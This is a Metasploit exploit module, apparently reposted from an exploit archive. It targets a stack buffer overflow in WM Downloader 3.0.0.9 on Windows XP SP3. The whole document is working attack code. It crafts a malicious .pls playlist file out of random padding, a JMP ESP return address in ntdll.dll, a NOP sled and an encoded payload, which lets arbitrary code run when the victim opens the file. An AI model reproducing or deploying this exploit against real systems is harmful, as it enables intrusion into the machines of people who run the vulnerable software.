WM Downloader v3.0.0.9 Buffer Overflow (Meta)
=============================================

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039; => &#039;WM Downloader Buffer Overflow Exploit&#039;,
            &#039;Description&#039; => %q{
                This module exploits a stack overflow in WM Downloader
version 3.0.0.9.
            By creating a specially crafted .pls file, an an attacker may be
able
            to execute arbitrary code.
            },
            &#039;License&#039; => MSF_LICENSE,
            &#039;Author&#039; =>
                [
                    &#039;Blake&#039;,
                ],
            &#039;Version&#039; => &#039;$Revision: 1 $&#039;,
            &#039;References&#039; =>
                [
                    [ &#039;OSVDB&#039;, &#039;62614&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/11384&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;thread&#039;,
                },
            &#039;Payload&#039; =>
                {
                    &#039;Space&#039; => 1904,
                    &#039;BadChars&#039; => "\x00\x0a\x0d\x20",
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039; =>
                [
                    [ &#039;Windows XP SP3&#039;, { &#039;Ret&#039; => 0x7C96BF33} ],         #
ntdll.dll JMP ESP
                ],
            &#039;Privileged&#039; => false,
            &#039;DisclosureDate&#039; => &#039;Feb 10 2010&#039;,
            &#039;DefaultTarget&#039; => 0))
 
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;,
&#039;exploit.pls&#039;]),
            ], self.class)
    end
 
 
    def exploit
 
        sploit = rand_text_alphanumeric(26084)
        sploit << [target.ret].pack(&#039;V&#039;)
        sploit << make_nops(20)
        sploit << payload.encoded
        sploit << rand_text_alphanumeric(28000 - payload.encoded.length)
 
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
        file_create(sploit)
 
    end
 
end



